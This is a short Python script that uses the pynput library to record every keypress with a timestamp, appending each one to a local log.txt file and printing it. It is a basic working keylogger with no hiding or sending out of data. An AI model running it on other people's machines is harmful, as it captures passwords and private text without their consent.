import pynput
from pynput.keyboard import Key,Listener
import datetime

def on_press(key):
    time = str(datetime.datetime.now())
    file = open('log.txt' , 'a+')
    keyLog = '{1} -> {0} - Pressed\n' .format(key,time)
    file.write(keyLog)
    print(keyLog)
    file.close()

def on_release(key):
    pass
    
with Listener(on_press = on_press,on_release=on_release) as listener:
    listener.join()
